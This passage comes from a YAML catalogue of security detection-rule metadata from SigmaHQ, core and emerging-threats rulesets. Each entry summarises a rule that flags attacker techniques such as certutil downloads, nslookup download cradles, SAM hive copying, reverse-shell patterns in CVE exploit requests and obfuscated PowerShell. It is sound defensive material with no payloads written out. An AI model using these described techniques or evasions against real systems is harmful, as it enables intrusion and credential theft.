    or 'C:\Windows\WinSxS\'. This is indicative of potential abuse and requires further
    investigation.
  Updated-Date: '2024_09_03'
195c1119-ef07-4909-bb12-e66f5e07bf3c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3191263ba9156e248a5ac30d40293fc1
  Ruleset: sigmahq
  Summary: This rule detects the download of specific file types from hosts that use
    dynamic DNS names, recognizing a potential indicator of malicious activity. The
    files monitored include common executable and script formats such as .exe, .vbs,
    .bat, .ps1, and various document formats like .doc, .xls, .pptm, among others.
    The rule identifies suspicious downloads originating from a specific list of dynamic
    DNS providers, which are often used by attackers for evasion and command-and-control
    purposes. It helps in identifying instances where these dynamically resolved domains
    could be used maliciously to distribute malware or perform unauthorized data transfers.
    The focus is on enhancing defense against techniques aimed at bypassing traditional
    network defenses.
  Updated-Date: '2024_09_04'
195e1b9d-bfc2-4ffa-ab4e-35aef69815f8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eaa413a653a4107f3528c22fa9d197af
  Ruleset: sigmahq
  Summary: This rule detects when a full data export is triggered in Bitbucket, as
    indicated by specific audit log events under the category 'Data pipeline' and
    the action 'Full data export triggered'. This activity can be associated with
    significant data exfiltration risks and could be indicative of malicious behavior.
    However, legitimate user activity could also trigger this detection.
  Updated-Date: '2024_09_04'
19951c21-229d-4ccb-8774-b993c3ff3c5c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e03eced002c838b2371b42ee189a1d62
  Ruleset: sigmahq
  Summary: This rule detects when an API token is created within Okta, identifying
    the event type as "system.api_token.create." The intent is to monitor for instances
    where new API tokens are generated, which could indicate both legitimate administrative
    activities by authorized users or potential unauthorized access attempts that
    might compromise the system.
  Updated-Date: '2024_09_04'
19aa4f58-94ca-45ff-bc34-92e533c0994a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f79eeff70059911241e7984d49dea53
  Ruleset: sigmahq
  Summary: This rule detects suspicious user-agent strings that are commonly associated
    with known scanning and reconnaissance tools. The specific user-agents identified
    include those from Wfuzz, WPScan, Recon-ng, and a user-agent string used by GIS
    - AppSec Team - Project Vision. These user-agents are monitored to identify potentially
    malicious activities such as initial access attempts (MITRE ATT&CK T1190) on web
    servers.
  Updated-Date: '2024_09_04'
19aefed0-ffd4-47dc-a7fc-f8b1425e84f9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3435b23f9d2614be3169efa34bb595db
  Ruleset: sigmahq
  Summary: This rule detects SQL exceptions in Python applications as defined by PEP
    249. It identifies specific error types such as DataError, IntegrityError, ProgrammingError,
    and OperationalError, which can indicate issues in SQL database interactions.
  Updated-Date: '2024_09_04'
19b041f6-e583-40dc-b842-d6fa8011493f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bcd214d37079a2291a8e408d0d9cf41c
  Ruleset: sigmahq
  Summary: This rule detects the creation of a named file stream containing the import
    hash (imphash) of a well-known hack tool. Tools include widely recognized malicious
    software such as Mimikatz, which is commonly used for credential dumping, JuicyPotato
    and RoguePotato, both linked to privilege escalation exploits, and Pwdump, which
    extracts password hashes. The list also includes Cobalt Strike, used for post-exploitation,
    and a range of other tools like HandleKatz, DripLoader, and RoguePotato, amongst
    others, each associated with various malicious activities such as bypassing security
    mechanisms, silencing event logs, and dumping memory for further exploits. The
    rule relies on an activated Sysmon configuration that logs imphashes to identify
    these named file streams.
  Updated-Date: '2024_09_04'
19b08b1c-861d-4e75-a1ef-ea0c1baf202b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: db1076a40c42ac39a3a2c041a8effd16
  Ruleset: sigmahq
  Summary: This rule detects the execution of `certutil.exe` with specific flags that
    allow this utility to download files. The detection focuses on instances where
    the command line includes particular parameters such as 'urlcache' or 'verifyctl',
    and where 'http' is present in the command line, indicating network activity related
    to downloading. Certutil is primarily a command-line utility for managing certificates
    in Windows, but it can be misused for downloading and verifying files in malicious
    activities.
  Updated-Date: '2024_09_04'
19bf6fdb-7721-4f3d-867f-53467f6a5db6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52aae38dd4b5e0300171d03e1e8eb40b
  Ruleset: core
  Summary: This rule detects an executable on a Linux system accessing an Ngrok tunneling
    endpoint. Ngrok is a service that facilitates the creation of secure tunnels to
    localhost, allowing remote access to local servers. The detection of communication
    with Ngrok endpoints may indicate unauthorized exfiltration of data or command-and-control
    activities by malicious actors. Potential benign uses of Ngrok are acknowledged
    but considered rare in this context.
  Updated-Date: '2024_09_03'
1a0a2ff1-611b-4dac-8216-8a7b47c618a6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ddb46b1f8893cddb0e378ab8341bdffb
  Ruleset: core
  Summary: This rule detects the use of obfuscated PowerShell scripts that leverage
    Clip.exe, a Windows clipboard utility, to perform potentially malicious activities.
    It monitors for specific event IDs and patterns in scripts indicative of attempts
    to evade security measures and execute hidden PowerShell commands. This behavior
    is often associated with advanced threat actors employing defensive evasion techniques.
  Updated-Date: '2024_09_03'
1a0d4aba-7668-4365-9ce4-6d79ab088dfd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bb2a283f1e48cf16e10bfc01b41b012
  Ruleset: core
  Summary: This rule detects the use of the ping command with a hex-encoded IP address
    on Windows systems. It specifically targets instances where the `ping.exe` process
    is executed with a command line containing the '0x' prefix, indicative of hexadecimal
    representation. This uncommon activity can be a sign of defense evasion tactics,
    as it is highly unlikely for a legitimate administrator to ping IP addresses in
    such a format.
  Updated-Date: '2024_09_03'
1a1ed54a-2ba4-4221-94d5-01dee560d71e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8e5c1f48bd6fbe7eeeaf27a349ee0e1f
  Ruleset: core
  Summary: This rule detects the use of a renamed variant of the legitimate 'createdump.exe'
    utility, a LOLBIN (Living Off The Land Binary), to dump process memory on Windows
    systems. It identifies specific command-line parameters that suggest the use of
    'createdump.exe' in its dumping operation, which may indicate malicious intent,
    particularly under scenarios of defense evasion and credential dumping.
  Updated-Date: '2024_09_03'
1a2d6c47-75b0-45bd-b133-2c0be75349fd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7b90093cdd4974c22d3800faa297433f
  Ruleset: core
  Summary: This rule detects potential malicious modification of the Wdigest setting
    in the Windows Registry, specifically targeting the value of IsCredGuardEnabled.
    The modification aims to disable Credential Guard, which is a security feature
    designed to protect cached credentials. By altering this registry value, attackers
    may bypass Credential Guard to manipulate cached credentials, often in conjunction
    with the UseLogonCredential setting.
  Updated-Date: '2024_09_03'
1a2ea919-d11d-4d1e-8535-06cda13be20f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 394cae51a8a241e8c92209b1ce0b26f9
  Ruleset: core
  Summary: This rule detects the creation of files named "ebpfbackdoor" in the "cron.d"
    and "sudoers.d" directories on Linux systems, a method associated with the TripleCross
    eBPF rootkit for persistence.
  Updated-Date: '2024_09_03'
1a31b18a-f00c-4061-9900-f735b96c99fc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8547317db00c4a1924b1a707d45bd020
  Ruleset: sigmahq
  Summary: This rule detects the installation of services related to various remote
    access tools on Windows systems. Remote access tools, such as Ammyy Admin, Atera,
    GoToAssist, LogMeIn, TeamViewer, and others, are legitimate software used for
    remote management and assistance but are often exploited by threat actors for
    unauthorized access and control. The detection relies on monitoring events from
    the Service Control Manager, specifically looking for event IDs 7045 and 7036
    that indicate service installation or state changes. The rule flags these activities
    to alert administrators to potential misuse of remote access capabilities.
  Updated-Date: '2024_09_04'
1a395cbc-a84a-463a-9086-ed8a70e573c7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 46759b0734c80aa9ac76fb58ef23fa91
  Ruleset: sigmahq
  Summary: This rule detects the use of default credentials on assets before they
    are deployed, ensuring that all default passwords are changed to values consistent
    with administrative level accounts. It is designed to identify vulnerabilities
    using the Qualys vulnerability scanner, specifically targeting various identified
    scan types related to vulnerability management to prevent unauthorized access.
  Updated-Date: '2024_09_04'
1a41023f-1e70-4026-921a-4d9341a9038e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c33f0c37fc20272a2b81094094a3d89
  Ruleset: core
  Summary: This rule detects sign-ins originating from geographically distant locations,
    which could indicate anomalous or suspicious activity. It is designed to flag
    situations where one or both of the locations are atypical for the user based
    on their historical sign-in behavior. The detection is specifically useful for
    identifying potential security risks related to unauthorized access, persistence,
    defense evasion, privilege escalation, and initial access within an Azure environment.
  Updated-Date: '2024_09_03'
1a42dfa6-6cb2-4df9-9b48-295be477e835:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 984ab1036c90b2b0a3d41beb977b986e
  Ruleset: core
  Summary: This rule detects the load of a signed WinRing0 driver on Windows systems.
    WinRing0 is often exploited by threat actors, crypto miners (such as XMRIG), or
    malware to achieve privilege escalation. The presence of this driver may indicate
    malicious activity, as it allows programs to execute code with high-level privileges,
    potentially compromising system security. Detection focuses on specific file names
    and hash values associated with WinRing0 components.
  Updated-Date: '2024_09_03'
1a433e1d-03d2-47a6-8063-ece992cf4e73:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f8acc18a8023af02ca955248e9cada96
  Ruleset: emerging-threats
  Summary: This rule detects the creation of the Autoit3.exe file by uncommon and
    suspicious processes such as curl.exe and KeyScramblerLogon, which are not typically
    associated with creating this executable. This behavior has been linked to DarkGate
    malware, which utilizes Autoit3.exe to execute shellcode for process injection
    and to communicate with its command-and-control server, indicating potential malicious
    activity.
  Updated-Date: '2024_09_03'
1a5c46e9-f32f-42f7-b2bc-6e9084db7fbf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7c6b7819e0db10ad4153b34d6f81c4d0
  Ruleset: core
  Summary: This rule detects registry changes in Microsoft Office that set the "AccessVBOM"
    value to "1." This modification disables trust access for VBA (Visual Basic for
    Applications) on the affected machine, allowing attackers to execute malicious
    macros without triggering Microsoft Office warnings. This tactic is often employed
    to evade security defenses and facilitate unauthorized macro execution.
  Updated-Date: '2024_09_03'
1a5fefe6-734f-452e-a07d-fc1c35bce4b2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5fe6abf840be897a5a00f4aeb32e9a8
  Ruleset: sigmahq
  Summary: This rule detects the deletion of a port or application rule in the Windows
    Firewall configuration executed via the netsh.exe command-line utility. Specifically,
    it identifies instances where netsh.exe is used with arguments related to the
    firewall and the deletion of rules within it. The detection method filters out
    cases where Dropbox.exe is the parent process running netsh.exe with specific
    command line inputs related to Dropbox, reducing false positives from legitimate
    software operations.
  Updated-Date: '2024_09_04'
1a821580-588b-4323-9422-660f7e131020:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c31c48a39fde4841e50c331171a188e7
  Ruleset: emerging-threats
  Summary: This rule detects file modifications to the temporary XML user database
    file on a ScreenConnect server, which indicates local user modification. Such
    activity can occur due to the exploitation of the ScreenConnect Authentication
    Bypass vulnerability (CVE-2024-1709) in versions prior to 23.9.8. However, these
    modifications may also be legitimate changes to local users or permissions.
  Updated-Date: '2024_09_03'
1a9a04fd-02d1-465c-abad-d733fd409f9c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64a156f4f475cf799d74544e98cfcc4d
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit an Apache Spark server via CVE-2022-33891
    from a weblogs perspective. The vulnerability allows an attacker to perform shell
    command injection by manipulating the query parameters in web requests. Detecting
    suspicious query strings that contain patterns like '?doAs=`' can help identify
    these exploitation attempts. Potential false positives may come from web vulnerability
    scanners. The rule aims to highlight unauthorized command execution attempts,
    ensuring heightened security and response measures for Apache Spark deployments.
  Updated-Date: '2024_09_03'
1a9bb21a-1bb5-42d7-aa05-3219c7c8f47d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d8203c51e39e9c9bb5a370ba4ece5d0
  Ruleset: sigmahq
  Summary: This rule detects update check requests made by Advanced IP Scanner and
    Advanced Port Scanner utilities. The request URL contains the path '/checkupdate.php'
    along with specific query parameters like 'lng', 'ver', 'beta', 'type', 'rmode',
    and 'product'. These utilities are used for network discovery and port scanning,
    and the detected pattern indicates they are checking for available updates. Legitimate
    occurrences may arise if these utilities are intentionally used in the environment.
  Updated-Date: '2024_09_04'
1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f141692c8c2d718d0efa9d002d1902f
  Ruleset: core
  Summary: This rule detects changes to the EC2 instance startup script in AWS. Executed
    as root or SYSTEM, this shell script runs at every boot of the specified instances.
    By monitoring events from the EC2 service in AWS CloudTrail, the rule identifies
    modifications to the instance attributes, particularly changes involving user
    data.
  Updated-Date: '2024_09_03'
1ac14d38-3dfc-4635-92c7-e3fd1c5f5bfc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5681fc365fe7929d782a5e0b03f8bfb
  Ruleset: sigmahq
  Summary: This rule detects the execution of WinRAR or its command line interface
    to compress files with extensions such as ".dmp", ".dump", or ".hdmp". These types
    of files are typically memory dump files, and their compression could indicate
    an attempt to exfiltrate potentially sensitive data. The rule identifies processes
    where the executable name contains "rar.exe" or "winrar.exe" and the command line
    includes the mentioned dump file extensions. Key scenarios addressed by this rule
    include the potential malicious use of WinRAR to bundle up memory dumps, which
    may be exfiltrated as part of a cyber attack.
  Updated-Date: '2024_09_04'
1ac8666b-046f-4201-8aba-1951aaec03a3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef19235c9ec5dddef7a233424a67e963
  Ruleset: sigmahq
  Summary: This rule detects a suspicious command line execution that includes both
    a URL and an AppData string in the command line parameters, a pattern commonly
    associated with several types of droppers, such as those using JavaScript or Visual
    Basic Script to invoke PowerShell. This activity might signify attempts to download
    or execute malicious content, leveraging the AppData directory for stealth and
    persistence.
  Updated-Date: '2024_09_04'
1ae64f96-72b6-48b3-ad3d-e71dff6c6398:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8c5260ff8a2bc9cf414a4a039c630292
  Ruleset: sigmahq
  Summary: This rule detects executables launched from external WebDAV shares using
    the WebDAV Explorer integration, which is frequently observed in initial access
    campaigns. By identifying specific file types (e.g., `.exe`, `.js`, `.ps1`) accessed
    via WebDAV, it helps in spotting malicious activities that involve launching executables
    from these remote shares. The detection focuses on HTTP GET requests initiated
    by the Microsoft-WebDAV-MiniRedir user agent. It excludes internal network IPs
    to reduce false positives, ensuring that the focus remains on external sources
    that are more likely to be associated with potential threats.
  Updated-Date: '2024_09_04'
1af57a4b-460a-4738-9034-db68b880c665:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 093bdb853ae381efcbf5f96293c66105
  Ruleset: core
  Summary: This rule detects suspicious PowerShell scripts accessing Security Account
    Manager (SAM) hives on Windows systems. Indicators include commands involving
    copying items from 'HarddiskVolumeShadowCopy' or the 'System32\config\sam' path,
    often using terms such as 'Copy-Item', 'cp $_.', 'cpi $_.', 'copy $_.', or '.File]::Copy('.
    The activity may signify an attempt to exploit vulnerabilities like HiveNightmare
    or SeriousSAM to extract credentials.
  Updated-Date: '2024_09_03'
1b2ae822-6fe1-43ba-aa7c-d1a3b3d1d5f2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1fb2f3a4771bfd0376a5dd0d2ef0e10b
  Ruleset: core
  Summary: This rule detects the installation of services with suspicious folder patterns
    in Windows systems. It specifically looks for events from the Service Control
    Manager with event ID 7045 and examines the image paths of installed services
    for patterns that include executable files in directories like "C:\ProgramData\"
    or directly under "C:\" with unusual subdirectory formats.
  Updated-Date: '2024_09_03'
1b2eeb27-949b-4704-8bfa-d8e5cfa045a1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e6401ce927ec96352da918b386011e0
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts targeting Centos Web
    Panel 7, specifically focused on the unauthenticated remote code execution vulnerability
    identified as CVE-2022-44877. The detection criteria include specific POST requests
    to '/login/index.php' with certain parameters indicating potential exploit attempts,
    such as the presence of common reverse shell keywords and base64-encoded strings
    related to the execution of Python scripts. Potential false positives may include
    activity from web vulnerability scanners. The rule aims to identify suspicious
    web server log entries that could indicate an exploitation attempt.
  Updated-Date: '2024_09_03'
1b3b01c7-84e9-4072-86e5-fc285a41ff23:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fabc1bbb841ec34d73d901409bfc7f2f
  Ruleset: sigmahq
  Summary: This rule detects the use of PowerShell to execute a download cradle via
    the nslookup utility on Windows systems. Specifically, it identifies instances
    where nslookup.exe is invoked by either powershell.exe or pwsh.exe processes,
    and the command line includes parameters such as "-q=txt" or "-querytype=txt".
    This method leverages DNS records to extract payloads, indicating potential defense
    evasion tactics by the attacker.
  Updated-Date: '2024_09_04'
1b45b0d1-773f-4f23-aedc-814b759563b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 287232f25cf02781b4b0fab7b4b2058e
  Ruleset: core
  Summary: This rule detects when configuration changes are made to an application's
    AppID URI. Such activities could indicate attempts at persistence, credential
    access, or privilege escalation by modifying or removing the AppID URI for applications
    or service principals in Azure audit logs. Although legitimate changes could be
    made by an administrator, these should be planned events to avoid false positives.
  Updated-Date: '2024_09_03'
1b9dc62e-6e9e-42a3-8990-94d7a10007f7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e919208bb24f161aa60f815e803ae6b6
  Ruleset: core
  Summary: This rule detects variations of obfuscated PowerShell IEX (Invoke-Expression)
    invocation code that is generated by the Invoke-Obfuscation framework. The detection
    focuses on patterns within script block text, such as specific manipulations of
    `PSHome`, `ShellId`, `env:Public`, and `env:ComSpec` variables, as well as other
    characteristic strings like `*mdr*` and manipulations involving `VerbosePreference`.
    The rule is designed to identify these obfuscation techniques commonly used for
    defense evasion and malicious execution within Windows PowerShell scripts.
  Updated-Date: '2024_09_03'
1bac86ba-41aa-4f62-9d6b-405eac99b485:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bb3feea12d826918d052e8459fd2a7ad
  Ruleset: sigmahq
  Summary: This rule detects the creation of systemd services on Linux systems, which
    could be exploited by adversaries to execute malicious code. It identifies when
    new files are created in specific directories commonly used for systemd services,
    such as `/usr/lib/systemd/system/`, `/etc/systemd/system/`, and user-specific
    service directories like `/.config/systemd/user/`. Frequent activities include
    persistence techniques and potential malicious behaviors, though legitimate administrative
    service installations may also trigger detections.
  Updated-Date: '2024_09_04'
1bbf25b9-8038-4154-a50b-118f2a32be27:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b01c080d59f5ee847adafae894ae9e9d
  Ruleset: core
  Summary: This rule detects the creation of suspicious local accounts on Windows
    systems that resemble the ANONYMOUS LOGON account, particularly those using additional
    spaces in their names. This is aimed at covering detections where Logon Type 3
    from ANONYMOUS LOGON accounts might be excluded, which could be indicative of
    malicious activity or persistence mechanisms by attackers. The rule specifically
    looks for events with ID 4720 that contain the terms 'ANONYMOUS' and 'LOGON' in
    the SamAccountName field.
  Updated-Date: '2024_09_03'
1bc2e6c5-0885-472b-bed6-be5ea8eace55:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3a9c56aa7a14dac8d1f4b8e65b13a95
  Ruleset: sigmahq
  Summary: This rule detects the execution of AppleScript, a macOS scripting language,
    by monitoring processes where the image ends with '/osascript' and the command
    line contains specific indicators such as ' -e ', '.scpt', or '.js'. Application
    installers may occasionally trigger these detections due to embedded scripts in
    the installation process.
  Updated-Date: '2024_09_04'
1bf0ba65-9a39-42a2-9271-31d31bf2f0bf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 89819ae7f0db113ed35fe061a5f6eed3
  Ruleset: emerging-threats
  Summary: This rule detects specific process behaviors involving the execution of
    "rundll32.exe" where the associated Dynamic Link Library (DLL) file lacks the
    typical ".dll" extension. This behavior is often indicative of potential Pikabot
    malware activity, particularly when the involved DLLs are located in directories
    like "ProgramData," "Users\Public," "Windows\Installer," "AppData\Local\Temp,"
    or "AppData\Roaming." The rule identifies such executions initiated through common
    parent processes such as "cmd.exe," "cscript.exe," "mshta.exe," "powershell.exe,"
    "pwsh.exe," "regsvr32.exe," and "wscript.exe," excluding cases where the command
    line contains known extensions like ".dll" or ".cpl" to eliminate false positives.
  Updated-Date: '2024_09_03'
1c0e41cd-21bb-4433-9acc-4a2cd6367b9b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aefcfb3d040d2025dda1b931f2ff4960
  Ruleset: core
  Summary: This rule detects attempts to modify existing scheduled tasks to execute
    from suspicious locations, a tactic often employed by attackers. By altering an
    already created task, attackers aim to evade initial detection. The process involves
    using commands such as `schtasks.exe /Change /TN` and specifying directories like
    `AppData\Local\Temp`, `Users\Public`, or paths typically associated with temporary
    or user data. Furthermore, the rule identifies commands linked with potentially
    malicious binaries and scripts, including `regsvr32`, `rundll32`, `cmd`, `powershell`,
    and various others. This detection mechanism is crucial for identifying when legitimate
    task scheduling functionalities are misused for malicious activities.
  Updated-Date: '2024_09_03'
1c12727d-02bf-45ff-a9f3-d49806a3cf43:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b3b7d37afae2b256fa513a4ff4c4cce1
  Ruleset: core
  Summary: This rule detects the execution of a renamed version of the Plink binary
    on Windows systems. Plink, part of the PuTTY suite, is typically used for command-line
    connections to remote systems via SSH. The specific conditions for detection are
    the presence of command line arguments that include `-l forward`, `-P`, and `-R`,
    without the image filename ending in 'plink.exe'. This indicates an attempt to
    disguise the Plink binary, likely for malicious purposes such as defense evasion.
  Updated-Date: '2024_09_03'
1c3121ed-041b-4d97-a075-07f54f20fb4a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e032f5fea36ac4be8826b38db9adbcae
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Windows Registry that disable specific
    internal tools or functions in Windows Explorer. These modifications can be indicative
    of malware activity, such as Agent Tesla, which employs this technique to evade
    detection and persist in a system. The rule monitors changes to registry keys
    under 'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer' that correspond
    to various user restrictions, such as disabling the logoff function, hiding the
    desktop, and removing access to the Control Panel.
  Updated-Date: '2024_09_04'
1c373b6d-76ce-4553-997d-8c1da9a6b5f5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7e7b3ffae719b15a7ed5fe81f59c0951
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of the privilege escalation vulnerability
    through the use of SetupComplete.cmd and PartnerSetupComplete.cmd, as described
    in CVE-2019-1378. This vulnerability leverages specific script execution during
    the Windows setup process to gain elevated privileges. The rule identifies suspicious
    usage patterns in command line executions involving `cmd.exe` that include references
    to Windows setup scripts.
  Updated-Date: '2024_09_03'
1c526788-0abe-4713-862f-b520da5e5316:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a289df3d1f41a7ad010f1bede108bae9
  Ruleset: core
  Summary: This rule detects the execution of Chromium-based browser processes (such
    as Brave, Chrome, Microsoft Edge, Opera, or Vivaldi) when they are run in headless
    mode with a command line that includes a URL pointing to the mockbin.org service.
    The use of the "headless" flag and accessing mockbin.org could indicate an attempt
    to exfiltrate data, which requires further investigation due to its potential
    severity.
  Updated-Date: '2024_09_03'
1c563233-030e-4a07-af8c-ee0490a66d3a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 64f961be45d3eba91fba385c49a51c16
  Ruleset: sigmahq
  Summary: This rule detects the use of the `New-PSDrive` cmdlet in PowerShell to
    create a new drive mapping to a remote network share using Server Message Block
    (SMB), specifically targeting administrative shares (e.g., `\\server\C$`). It
    is commonly employed by adversaries to interact with a network share and perform
    actions using the permissions of the logged-on user. The detection focuses on
    identifying script block text that contains specific patterns indicative of the
    `New-PSDrive` cmdlet being used to access SMB shares with administrative rights.
  Updated-Date: '2024_09_04'
1c71e254-6655-42c1-b2d6-5e4718d7fc0a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4db42e085a5d3b33074283d951d913b4
  Ruleset: sigmahq
  Summary: This rule detects the execution of an Azure Kubernetes CronJob within the
    Azure Cloud environment. A Kubernetes CronJob is a controller used to schedule
    jobs, creating one or more pods to perform finite tasks such as batch jobs. Adversaries
    may exploit Kubernetes CronJobs to schedule and execute malicious code as containers
    within the cluster.
  Updated-Date: '2024_09_04'
1c8774a0-44d4-4db0-91f8-e792359c70bd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d323b83fcf4be35ea386dbb819ba26a9
  Ruleset: sigmahq
  Summary: This rule detects the execution of the 'REGISTER_APP.VBS' script, a Microsoft
    signed script used for registering a VSS/VDS Provider as a COM+ application.
  Updated-Date: '2024_09_04'
1c8e96cd-2bed-487d-9de0-b46c90cade56:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 471c89258a875b1a6a5d2fc762575cde
  Ruleset: core
  Summary: This rule detects registry activity indicative of Qakbot malware, specifically
    targeting a registry key used by IceID during campaigns that distribute malicious
    OneNote files. Qakbot is known for its data theft and network propagation capabilities,
    often linked to banking fraud and ransomware. By monitoring this specific registry
    key pattern, the rule aims to identify and mitigate the spread of such malware
    on Windows systems.
  Updated-Date: '2024_09_03'
1ca6bd18-0ba0-44ca-851c-92ed89a61085:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 56c8adb11844588946f2b62bb905cac1
  Ruleset: core
  Summary: This rule detects the pattern of a User Account Control (UAC) Bypass using
    consent.exe and comctl32.dll, which is characteristic of the UACMe tool (specifically
    version 22). It identifies instances where processes are initiated by consent.exe,
    resulting in the execution of werfault.exe with high or system integrity levels.
    This behavior is associated with techniques for evading defenses and escalating
    privileges on Windows operating systems.
  Updated-Date: '2024_09_03'
1cb0c6ce-3d00-44fc-ab9c-6d6d577bf20b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2dbc5f8117bc34ed16140b64f0854350
  Ruleset: sigmahq
  Summary: This rule detects DNS query requests to domains associated with Devtunnels.
    Devtunnels is a feature that can be misused by attackers to establish a reverse
    shell or maintain persistence on a target machine. This detection focuses on identifying
    queries that end with '.devtunnels.ms', which may indicate suspicious activity
    related to command-and-control operations. Although legitimate use of Devtunnels
    can also trigger this detection, such queries are typically associated with potential
    security threats.
  Updated-Date: '2024_09_04'
1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9d17183e52b57ea6410923ecbad0e45
  Ruleset: core
  Summary: This rule detects a suspicious process involving rundll32.exe that invokes
    inline VBScript via specific command-line patterns. The command line components
    include 'rundll32.exe', 'Execute', 'RegRead', and 'window.close'. This technique
    has been observed being used by the threat group UNC2452. The detection aims to
    identify potential malicious activities related to VBScript execution through
    the rundll32.exe utility, which may indicate an attempt to evade defenses or execute
    unauthorized commands.
  Updated-Date: '2024_09_03'
1cdd9a09-06c9-4769-99ff-626e2b3991b8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d6b29ccf0e6a3af4d0b22bf41d17306
  Ruleset: core
  Summary: This rule detects the execution of files with suspicious double extensions,
    such as '.pdf.exe' or '.docx.js', which are often used to disguise executable
    files as harmless documents in spear-phishing campaigns. The characteristic patterns
    include non-executable extensions followed by '.exe' or '.js', or the use of spaces
    or underscores to cloak the executable nature of the files. This behavior is typically
    indicative of initial access techniques in cyber-attacks.
  Updated-Date: '2024_09_03'
1ce8c8a3-2723-48ed-8246-906ac91061a6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d306ba9ece5ead56ae1fa99d9fe3438b
  Ruleset: core
  Summary: This rule detects potential PetitPotam coerced authentication activities
    by monitoring for specific patterns in Windows security logs. PetitPotam is a
    known technique used to coerce a target system into authenticating with an attacker-controlled
    machine, typically by exploiting certain features or vulnerabilities in the Windows
    operating system. The rule focuses on Event ID 5145, which logs detailed file
    share operations, and specifically looks for anonymous logon attempts to the 'lsarpc'
    file share that use an IPC$ share name pattern. This behavior is indicative of
